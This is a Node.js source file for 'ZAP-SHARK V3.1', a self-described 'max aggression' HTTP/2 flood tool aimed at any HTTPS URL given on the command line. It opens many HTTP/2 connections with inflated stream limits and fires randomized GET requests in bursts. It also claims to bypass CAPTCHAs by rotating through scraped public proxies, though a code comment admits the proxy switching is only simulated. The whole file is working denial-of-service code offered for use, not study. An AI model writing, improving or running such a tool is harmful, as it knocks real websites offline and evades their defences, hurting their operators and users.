const http2 = require('http2');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V31 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        this.wifiConnected = true;
        this.usingProxy = false;
        this.captchaDetected = false;
        
        // AGGRESSIVE SETTINGS
        this.connectionPool = [];
        this.poolSize = 15; // 3x more connections
        this.maxStreamsPerConn = 1000; // MAX H2 abuse
        this.activeStreams = 0;
        
        // BURST CYCLES
        this.burstActive = false;
        this.lastBurst = Date.now();
        this.burstInterval = 15000 + Math.random() * 15000; // 15-30s
        
        // PROXY SYSTEM
        this.proxyList = [];
        this.currentProxyIndex = 0;
        this.lastProxyRotate = Date.now();
        this.captchaCount = 0;
        
        // SIMPLE HEADERS (minimal overhead)
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];
        
        this.attackInterval = null;
        this.monitorInterval = null;
    }

    // === AGGRESSIVE CONNECTION SETUP ===
    setupConnections() {
        // DESTROY ALL OLD CONNECTIONS
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        
        // CREATE MAX CONNECTIONS
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536, // 64MB per connection
                    maxDeflateDynamicTableSize: 4294967296,
                    peerMaxConcurrentStreams: 10000
                });
                
                client.setMaxListeners(1000);
                
                // AGGRESSIVE SETTINGS
                client.settings({
                    enablePush: false,
                    initialWindowSize: 16777215, // 16MB window
                    maxConcurrentStreams: 10000
                });
                
                client.on('error', () => {});
                
                this.connectionPool.push(client);
            } catch (err) {
                // SILENT FAIL
            }
        }
    }

    // === AGGRESSIVE PROXY SYSTEM ===
    async fetchProxies() {
        return new Promise((resolve) => {
            const sources = [
                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=elite',
                'https://www.proxy-list.download/api/v1/get?type=http',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
            ];
            
            const source = sources[Math.floor(Math.random() * sources.length)];
            
            https.get(source, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    this.proxyList = data.trim().split('\n')
                        .filter(p => p && p.includes(':'))
                        .map(p => p.trim());
                    
                    if (this.proxyList.length > 0) {
                        console.log(`[+] Loaded ${this.proxyList.length} proxies`);
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                });
            }).on('error', () => resolve(false));
        });
    }

    rotateProxy() {
        if (this.proxyList.length === 0) return false;
        
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxyList.length;
        this.lastProxyRotate = Date.now();
        this.usingProxy = true;
        
        // RESET CONNECTIONS WITH PROXY (simulated - actual proxy setup would be more complex)
        this.setupConnections();
        
        return true;
    }

    // === ULTRA AGGRESSIVE REQUEST ===
    sendRequest() {
        if (!this.wifiConnected) return;
        
        // MAX STREAMS PER TICK
        const availableStreams = (this.maxStreamsPerConn * this.connectionPool.length) - this.activeStreams;
        const streamsThisTick = this.burstActive ? 
            Math.min(availableStreams, 50) : // BURST: 50 streams
            Math.min(availableStreams, 20);  // NORMAL: 20 streams
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2),
                    ':authority': this.hostname,
                    'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
                    'accept': '*/*'
                });
                
                req.on('response', (headers) => {
                    // CAPTCHA DETECTION
                    const body = '';
                    const contentType = headers['content-type'] || '';
                    const location = headers['location'] || '';
                    
                    if (contentType.includes('captcha') || 
                        contentType.includes('challenge') ||
                        location.includes('captcha') ||
                        body.includes('captcha') ||
                        headers[':status'] === 403) {
                        
                        this.captchaCount++;
                        if (this.captchaCount >= 2) {
                            this.captchaDetected = true;
                            this.rotateProxy();
                        }
                    }
                    
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
        
        // AGGRESSIVE BURST CYCLING
        const now = Date.now();
        if (now - this.lastBurst >= this.burstInterval) {
            this.burstActive = !this.burstActive;
            this.lastBurst = now;
            this.burstInterval = 5000 + Math.random() * 10000; // 5-15s next burst
        }
    }

    // === DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const connectionStatus = this.wifiConnected ? "CONNECTED" : "UNCONNECTED";
        const modeStatus = this.usingProxy ? "PROXY" : "DIRECT";
        const burstStatus = this.burstActive ? "🔥BURST" : "NORMAL";
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${this.formatRuntime()}) | STATUS: ${this.status}`);
        console.log('============================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`T-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('============================');
        console.log(`ZAP-SHARK — ${connectionStatus} | ${modeStatus} | ${burstStatus}`);
        
        if (this.captchaDetected) {
            console.log(`[!] CAPTCHA BYPASS ACTIVE | Proxies: ${this.proxyList.length}`);
        }
        if (this.usingProxy) {
            console.log(`Proxy: ${this.proxyList[this.currentProxyIndex]?.substring(0, 30) || 'Loading...'}`);
        }
    }

    // === WIFI CHECK ===
    checkWifi() {
        const interfaces = os.networkInterfaces();
        for (const iface in interfaces) {
            for (const config of interfaces[iface]) {
                if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
                    this.wifiConnected = true;
                    return true;
                }
            }
        }
        this.wifiConnected = false;
        return false;
    }

    // === MAIN ===
    async start() {
        console.log("=== ZAP-SHARK V3.1 - MAX AGGRESSION ===");
        console.log("Target:", this.targetUrl);
        console.log("Mode: NO LIMITS | CAPTCHA BYPASS | MAX H2 ABUSE");
        console.log("=".repeat(60));
        
        // Load proxies first
        await this.fetchProxies();
        
        // Setup aggressive connections
        this.setupConnections();
        
        // Initial display
        this.updateDisplay();
        
        // MAIN ATTACK LOOP - MAX SPEED
        setTimeout(() => {
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING" && this.wifiConnected) {
                    // SEND MULTIPLE REQUEST BATCHES PER TICK
                    for (let i = 0; i < 3; i++) {
                        this.sendRequest();
                    }
                    this.updateDisplay();
                }
            }, 0.05); // 20,000 ticks/sec potential
            
            // MONITOR & ADAPT
            this.monitorInterval = setInterval(() => {
                this.checkWifi();
                
                // AUTO PROXY ROTATION EVERY 2 MINS WHEN USING PROXY
                if (this.usingProxy && Date.now() - this.lastProxyRotate >= 120000) {
                    this.rotateProxy();
                }
                
                // RESET CAPTCHA COUNTER
                if (this.captchaCount > 0 && !this.captchaDetected) {
                    setTimeout(() => {
                        this.captchaCount = 0;
                    }, 10000);
                }
                
            }, 1000);
            
        }, 1000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.monitorInterval);
            console.log('\n=== ZAP-SHARK V3.1 STOPPED ===');
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v31.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V31(target);
shark.start();
